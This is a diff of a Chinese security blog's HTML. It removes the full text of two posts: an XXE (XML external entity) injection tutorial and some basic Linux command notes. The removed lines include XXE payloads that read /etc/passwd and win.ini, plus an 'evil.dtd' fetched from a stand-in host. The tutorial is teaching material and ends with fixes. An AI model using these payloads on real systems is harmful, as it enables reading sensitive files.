-<p>内部实体，实体的值来源于内部，外部实体顾名思义就是引用外部的值，两者的写法也差不多，外部实体仅仅是多引用了一个SYSTEM。</p>
-<table>
-<thead>
-<tr>
-<th>实体类型</th>
-<th>内部实体</th>
-<th>外部实体</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>语法</td>
-<td><!ENTITY 实体名称 ”实体的值"></td>
-<td><!ENTITY 实体名称 SYSTEM "URI/URL"></td>
-</tr>
-<tr>
-<td>例子</td>
-<td><!ENTITY writer "Bill F ates"></td>
-<td><!ENTITY writer SYSTEM "DTD1.dtd"></td>
-</tr>
-<tr>
-<td>XML例子</td>
-<td><author>&writer;</author></td>
-<td><author>&writer;</author></td>
-</tr>
-</tbody></table>
-<p>注意：引入外部的DTD文件时，dtd文件中存放的就是xml代码，并且引用外部实体的时候还可以使用各种伪协议，而不是仅限于http协议。</p>
-<p>内部实体和外部实体的代码区别</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0”?&gt;</span><br><span class="line">&lt;!DOCTYPE note[</span><br><span class="line">&lt;!ELEMENT note (name)&gt;</span><br><span class="line">&lt;!ENTITY hack3r “hu3sky”&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;hack3r;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0”?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">&lt;!ENTITY  name SYSTEM “http://xx.com/aa.dtd”&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;</span><br><span class="line">&lt;name&gt;&amp;name;&lt;/name&gt;</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>总结：内部实体就相当于自己编写的DTD内容，而外部实体就相当于引入外部的DTD内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XXE漏洞就存在于外部实体中，我们将恶意代码写入DTD文件中再通过外部实体引入</span><br></pre></td></tr></table></figure>
-
-<p><strong>2.漏洞演示</strong></p>
-<p>​	XML漏洞就是XML外部实体注入。引入外部实体方式有很多种，比如：实体<strong>不仅能用来存储指定数值，还能从本地文件或者远程文件中调用相关的数据作为后续实体引用</strong>。如外部实体就是其中之一。</p>
-<p>举例两个简单的外部实体攻击例子</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">XML内容：</span><br><span class="line">	&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">	&lt;!DOCTYPE a [</span><br><span class="line">		&lt;!ENTITY % d SYSTEM “file:///etc/passwd”&gt;</span><br><span class="line">        %d;</span><br><span class="line">	]&gt;</span><br><span class="line">	&lt;c&gt;%d;&lt;/c&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>此时c变量读取的值便是&#x2F;etc&#x2F;passwd文件的内容</p>
-<p>但这种方法会涉及到敏感内容</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">XML内容</span><br><span class="line">	&lt;?xml version=’1.0’?&gt;</span><br><span class="line">	&lt;!DOCTYPE a [</span><br><span class="line">			&lt;!ENTITY % d SYSTEM “http://abc.com/evil.dtd”&gt;</span><br><span class="line">	%d;</span><br><span class="line">	]&gt;</span><br><span class="line">	&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line"> </span><br><span class="line">Evil.dtd内容</span><br><span class="line"> </span><br><span class="line">	&lt;!ENTITY b SYSTEM “file://etc/passwd”&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>该方法通过引入外部的DTD文件，而文件中同样时读取敏感文件的恶意代码，但这样的方式被检测的可能性会被大大降低</p>
-<p><strong>3.判断是否存在XXE漏洞</strong></p>
-<ul>
-<li><strong>有回显时（文件读取、内网探测）</strong></li>
-</ul>
-<p>看它是否能解析XML数据，所以我们直接传入一段XML代码看它是否能解析</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE name </span><br><span class="line">    [ &lt;!ENTITY hacker &quot;test&quot;&gt; ]&gt; </span><br><span class="line">&lt;name&gt;&amp;hacker;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>: 该代码就是给name变量赋一个test的值，把代码放入测试位置进行测试</p>
-<p>如果得到test值说明可能存在XXE漏洞</p>
-<ul>
-<li><p><strong>无回显时（查看受攻击机的服务器日志、通过DNSlog平台查看是否进行查询、burp插件进行验证）</strong></p>
-<p><img src="/XXE.assets/image-20230919181903861.png" alt="image-20230919181903861"></p>
-<p><img src="/XXE.assets/image-20230919181851209.png" alt="image-20230919181851209"></p>
-<p><img src="/XXE.assets/image-20230919181955103.png" alt="image-20230919181955103"></p>
-<p><img src="/XXE.assets/image-20230919182026496.png" alt="image-20230919182026496"></p>
-<p><img src="/XXE.assets/image-20230919182056708.png" alt="image-20230919182056708"></p>
-</li>
-</ul>
-<p><strong>4.漏洞利用</strong></p>
-<p>外部实体引用可以使用的协议</p>
-<table>
-<thead>
-<tr>
-<th>语言-&gt;</th>
-<th>libxml2</th>
-<th>PHP</th>
-<th>JAVA</th>
-<th>.NET</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>协议</td>
-<td>file</td>
-<td>file</td>
-<td>http</td>
-<td>file</td>
-</tr>
-<tr>
-<td></td>
-<td>http</td>
-<td>http</td>
-<td>https</td>
-<td>http</td>
-</tr>
-<tr>
-<td></td>
-<td>ftp</td>
-<td>ftp</td>
-<td>ftp</td>
-<td>https</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td>php</td>
-<td>file</td>
-<td>ftp</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td>data</td>
-<td>jar</td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td>glod</td>
-<td>netdoc</td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td>phar</td>
-<td>mailto</td>
-<td></td>
-</tr>
-</tbody></table>
-<p><strong>1.直接外部实体注入</strong></p>
-<p>直接外部实体注入，就是通过协议直接执行恶意命令</p>
-<p>因为我是windows主机，这里我们以<strong>file协议</strong>来读取<strong>c:&#x2F;windows&#x2F;win.ini</strong>配置文件的内容，xml代码如下(注意这里的路径需要改变写法，不然会受到转义的影响)</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE name </span><br><span class="line">    [ &lt;!ENTITY hacker SYSTEM &quot;file:///c://windows//win.ini&quot;&gt; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;name&gt;&amp;hacker;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p><strong>2.间接外部实体注入</strong></p>
-<p>将恶意代码写在DTD文件中，在引入DTD文件</p>
-<ol>
-<li><p>构造外部dtd文件</p>
-<p>创建一个xxx.dtd文件，内容如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY hacker SYSTEM &quot;file:///c://windows//win.ini&quot;&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>让两台机器可以相互连接</p>
-</li>
-<li><p>构造XML代码</p>
-<p>引用外部实体的XML代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE name </span><br><span class="line">    [ &lt;!ENTITY % a SYSTEM &quot;http:///IP地址/xxx.dtd&quot;&gt; </span><br><span class="line">    %a;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;hacker&gt;%a;&lt;/hacker&gt;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="三-漏洞防范"><a href="#三-漏洞防范" class="headerlink" title="三.漏洞防范"></a>三.漏洞防范</h3><p>针对于XXE漏洞修复的就以下两点：</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.禁止使用外部实体，例如libxml disable_entity_loader(true)</span><br><span class="line">2.过滤用户提交的XML数据，防止出现非法内容</span><br></pre></td></tr></table></figure></blockquote>
-
       
     </div>
+    
+      <div class="article-more-link">
+        <a href="/2023/09/19/XXE/#more">read more</a>
+      </div>
     
     
     
@@ -495,38 +179,13 @@
     <div class="article-entry" itemprop="articleBody">
       
       
-        <p>第一章<br>pwd命令 显示当前所在目录</p>
-<p>cd命令<br>cd  进入用户主目录；<br>cd  ~ 进入用户主目录；<br>cd  - 返回进入此目录之前所在的目录；<br>cd  .. 返回上级目录(若当前目录为”&#x2F;“，则执行完后还在”&#x2F;“；”..”为上级目录的意思)；<br>cd  ..&#x2F;.. 返回上两级目录；<br>cd !$ 把上个命令的参数作为cd参数使用。</p>
-<p>ls命令<br>ls(list): 列出指定目录列表信息，如果没有参数默认列出当前目录下的所有文件和文件夹(隐藏文件和文件夹除外)。<br>-l：以长格式显示目录下的内容列表。输出的信息从左到右依次包括文件名，文件类型、权限模式、硬连接数、所有者、组、文件大小和文件的最后修改时间等；<br>-a：显示所有文件和文件夹(包括隐藏文件&#x2F;文件夹)。</p>
-<p>touch  创建文件的常用命令<br>同时创建多个文件touch test1 test2 …  </p>
-<p>rm [命令选项] test	<br>常用命令选项：<br> -f：强制删除文件或目录；<br> -r或-R：递归处理，将指定目录下的所有文件与子目录一并处理；<br> -i：删除已有文件或目录之前先询问用户。</p>
-<p>Linux中创建文件夹命令是mkdir<br>mkdir [命令选项] dirname<br>常用命令选项: -p或–parents 若所要建立目录的上层目录目前尚未建立，则会一立上层目录；</p>
-<p>Linux中删除文件夹的命令是rmdir或者rm -r，命令格式如下：<br>rmdir [命令选项] dirname<br>常用命令选项：-p或–parents：删除指定目录后，若该目录的上层目录已变成空目录，则将其一并删除；</p>
-<p>Linux使用cp命令用来将一个或多个源文件或者目录复制到指定的目录中，命令格式如下：<br>cp [命令选项] 源文件 目的文件<br>常用命令选项：<br>-f：强行复制文件或目录，不论目标文件或目录是否已存在；<br>-i：覆盖既有文件之前先询问用户；<br>-p：保留源文件或目录的属性；<br>-R&#x2F;r：递归处理，将指定目录下的所有文件与子目录一并处理。</p>
-<p>Linux使用mv命令用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中，命令格式如下：<br>mv [命令选项] 源文件 目标文件<br>常用命令选项：<br>-f：强行复制文件或目录，不论目标文件或目录是否已存在；<br>-i：覆盖既有文件之前先询问用户；<br>-p：保留源文件或目录的属性；<br>-R&#x2F;r：递归处理，将指定目录下的所有文件与子目录一并处理’。</p>
-<p>linux中使用man命令来查询命令的帮助文件,命令格式如下:<br>man [章节] command<br>常用命令如下：<br>d, Ctrl+D: 向文件尾部翻半屏；<br>u, Ctrl+U: 向文件首部翻半屏；<br>q: 退出；<br>#：跳转至第#行；<br>home: 回到文件首部；<br>end：翻至文件尾部。</p>
-<p>man包含9个章节，章节用数字表示，分别是：<br>用户命令<br>系统调用<br>C库调用<br>设备文件及特殊文件<br>配置文件格式<br>游戏<br>杂项<br>管理类的命令<br>Linux 内核API</p>
-<p>linux中使用info命令来查询命令的帮助文件。info页面比man page编写得要更好、更容易理解，也更友好，但man page使用起来确实要更容易得多。一个man page只有一页，而info页面几乎总是将它们的内容组织成多个区段（称为节点），每个区段也可能包含子区段（称为子节点）。<br>命令格式如下：<br>info [命令参数] command<br>常用命令参数选项：<br>-d：添加包含info格式帮助文档的目录；<br>-f：指定要读取的info格式的帮助文档；<br>-n：指定首先访问的info帮助文件的节点；<br>-o：输出被选择的节点内容到指定文件。</p>
-<p>Linux whatis命令<br>whatis用来显示命令的简短描述。<br>命令格式如下：<br>whatis command</p>
-<p>第二章<br>Linux创建用户命令<br>Linux中使用useradd命令来创建一个新用户。<br>命令格式格式：useradd [命令参数] 参数<br>常见命令参数：<br>-d&lt;登入目录&gt;：指定用户登入时的启始目录；<br>-D：查看或变更预设值；<br>-g&lt;群组&gt;：指定用户所属的群组；<br>-m：自动建立用户的登入目录；<br>-M：不要自动建立用户的登入目录；<br>-s：指定用户登入后所使用的shell。<br>useradd必须以root权限才能执行，如果是普通用户想创建一个新用户时，需要在命令前加sudo命令来提升权限为root权限。</p>
-<p><img src="/Linux%E8%B5%84%E6%96%99.assets/image-20230825155814848.png" alt="image-20230825155814848"></p>
-<p><code>Linux</code>中用户信息是保存在<code>/etc/passwd</code>文件中，我们可以使用命令<code>tail /etc/passwd</code>命令查看<code>/etc/passwd</code>文件最后10行中是否存在刚刚新创建的<code>test</code>用户信息。</p>
-<h5 id="Linux删除用户命令"><a href="#Linux删除用户命令" class="headerlink" title="Linux删除用户命令"></a>Linux删除用户命令</h5><p><code>Linux</code>中使用<code>userdel</code>命令来删除一个已经存在的用户。</p>
-<p>命令格式：<code>userdel [命令参数] 参数</code></p>
-<p>常见命令参数：</p>
-<ul>
-<li>-f：强制删除用户，即使用户当前已登录；</li>
-<li>-r：删除用户的同时，删除与用户相关的所有文件。</li>
-</ul>
-<p><code>userdel</code>必须以<code>root</code>权限才能执行，如果是普通用户想使用该命令时，需要在命令前加<code>sudo</code>命令来提升权限为<code>root</code>权限。</p>
-<p>第六章<br>locate 参数 文件&#x2F;目录</p>
-<p>-c   只输出找到的数量<br>-d   使用dapath指定数据库 不再是默认数据库<br>-i    忽略大小写<br>-q   不会显示任何错误信息<br>-e   只显示当前存在的文件条目</p>
-<p>updatedb</p>
-<p>-o&lt;文件&gt;  忽略默认的数据库文件，使用指定的slocate数据库文件<br>-U&lt;目录&gt;  更新指定目录的slocate数据库<br>-v               显示执行的详细过程</p>
-<p>必须得在root权限下使用，可以加sudo命令</p>
-
+        <h2 id="linux常见命令"><a href="#linux常见命令" class="headerlink" title="linux常见命令"></a>linux常见命令</h2><p>pwd命令 显示当前所在目录cd命令<br>cd  进入用户主目录；<br>cd  ~ 进入用户主目录；<br>cd  - 返回进入此目录之前所在的目录；</p>
       
     </div>
+    
+      <div class="article-more-link">
+        <a href="/2023/08/25/Linux%E8%B5%84%E6%96%99/#more">read more</a>
+      </div>
     
     
     
